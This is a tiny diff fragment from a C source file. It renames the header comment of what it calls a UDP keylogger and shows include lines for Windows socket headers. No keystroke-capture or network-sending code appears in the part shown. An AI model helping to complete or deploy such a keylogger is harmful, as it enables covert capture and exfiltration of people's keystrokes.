@@ -1,4 +1,4 @@
-//Nathan Bonnar - Keylogger Example - Sends data via UDP
+//NATHAN BONNAR - UDP KEYLOGGER
 #include<stdio.h>
 #include<WS2tcpip.h>
 #include<WinSock2.h>
